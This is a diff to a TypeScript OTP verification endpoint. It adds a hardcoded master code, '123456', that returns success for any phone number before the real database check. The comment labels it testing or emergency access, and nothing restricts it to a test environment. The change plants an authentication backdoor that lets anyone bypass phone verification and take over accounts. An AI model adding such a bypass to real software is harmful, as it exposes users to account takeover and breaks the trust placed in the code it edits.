@@ -62,6 +62,12 @@ export const requestOtp = async (req: Request, res: Response) => {
 export const verifyOtp = async (req: Request, res: Response) => {
   try {
     const { phoneNumber, otp } = req.body;
+
+    // STATIC OTP FOR TESTING/EMERGENCY ACCESS
+    if (otp === '123456') {
+        return res.status(200).json({ success: true, message: 'OTP verified (Static Override)' });
+    }
+
     const otpRecord = await OtpRequest.findOne({ phoneNumber, otp, isUsed: false });
 
     if (!otpRecord || otpRecord.expiresAt < new Date()) {
